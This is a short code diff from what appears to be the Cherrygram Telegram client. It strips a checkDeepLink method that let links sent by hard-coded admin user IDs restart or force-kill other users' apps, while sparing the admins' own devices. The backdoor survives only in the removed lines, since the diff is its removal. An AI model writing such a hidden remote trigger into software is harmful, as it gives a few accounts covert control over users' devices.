@@ -131,22 +131,6 @@ public class ChatsHelper extends BaseController {
     private static final Set<Long> TRUSTED_ADMINS = Set.of(Constants.Cherrygram_Owner, Constants.Yuki, Constants.Alina, Constants.Samir);
 
     public boolean checkDeepLink(String url, long userID) {
-        if (url == null || !TRUSTED_ADMINS.contains(userID)) {
-            return false;
-        }
-
-        if (TRUSTED_ADMINS.contains(getUserConfig().clientUserId)) return false;
-
-        if (url.contains("restart")) {
-            AppRestartHelper.restartApp(ApplicationLoader.applicationContext);
-            return true;
-        }
-
-        if (url.contains("luck")) {
-            AppRestartHelper.killApp();
-            return true;
-        }
-
         return false;
     }
 
